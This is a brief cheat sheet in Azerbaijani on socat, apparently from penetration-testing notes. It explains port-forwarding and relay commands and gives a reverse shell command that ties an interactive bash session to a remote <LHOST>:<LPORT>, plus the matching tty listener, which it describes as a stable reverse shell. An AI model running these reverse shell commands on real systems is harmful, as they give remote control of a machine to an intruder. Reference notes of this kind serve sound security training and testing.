# Socat


```bash
socat TCP-LISTEN:<LPORT>,fork TCP:<RHOST>:<RPORT>
```
**İzah:** Lokal portda (`<LPORT>`) dinləyir və gələn bağlantıları uzaqdakı hostun (`<RHOST>`) portuna (`<RPORT>`) yönləndirir. `fork` parametri hər bağlantı üçün ayrıca proses yaradır. Bu, **port forwarding/proxy** üçün istifadə olunur.

---

```bash
socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>
```
**İzah:** Terminalı TCP üzərindən gələn bağlantıya bağlayır. `raw,echo=0` parametrləri input-u “xam” rejimdə alır, terminalda yazılanlar görünmür. Bu, **stabil reverse shell** üçün istifadə olunur.

---

```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>
```
**İzah:** Gələn TCP bağlantısı ilə **interaktiv bash shell** işə salır.

```bash
socat tcp-listen:5986,reuseaddr,fork tcp:<RHOST>:9002
```
**İzah:** Lokal port 5986-da dinləyir və bütün bağlantıları `<RHOST>:9002` ünvanına yönləndirir. `reuseaddr` parametri portun təkrar istifadəsinə imkan verir.

---

```bash
socat tcp-listen:9002,reuseaddr,fork tcp:192.168.122.228:5968 &
```
**İzah:** 9002 portunda dinləyir, hər gələn bağlantını `192.168.122.228:5968` ünvanına yönləndirir və prosesi arxa planda (`&`) işləməyə qoyur.
